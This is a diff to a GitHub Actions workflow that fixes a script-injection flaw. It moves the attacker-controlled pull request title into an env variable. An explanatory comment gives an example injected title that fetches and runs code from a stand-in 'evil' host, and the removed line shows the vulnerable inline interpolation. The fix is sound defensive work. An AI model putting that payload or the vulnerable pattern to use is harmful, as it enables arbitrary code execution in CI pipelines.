@@ -111,8 +111,18 @@ jobs:
 
       - name: Extract ADR slug from PR title
         id: extract-slug
+        # The title is attacker-controlled (any PR author sets it), so it must
+        # reach the shell as data, never as source. Interpolating it inline —
+        # `TITLE="${{ github.event.pull_request.title }}"` — splices it into the
+        # script body, and a title of `$(curl evil|sh)` would execute. The env
+        # block binds it to a variable instead: the shell reads it after parsing,
+        # so no metacharacter in the value can become syntax. Found by actionlint
+        # (`expression`), not by any in-repo gate — the reason the workflow lint
+        # gate exists.
+        env:
+          PR_TITLE: ${{ github.event.pull_request.title }}
         run: |
-          TITLE="${{ github.event.pull_request.title }}"
+          TITLE="$PR_TITLE"
           # Convert title to kebab-case slug
           SLUG=$(echo "$TITLE" | sed 's/[^a-zA-Z0-9 ]//g' | tr '[:upper:]' '[:lower:]' | tr ' ' '-' | sed 's/-+/-/g' | sed 's/^-//' | sed 's/-$//')
           echo "slug=$SLUG" >> $GITHUB_OUTPUT
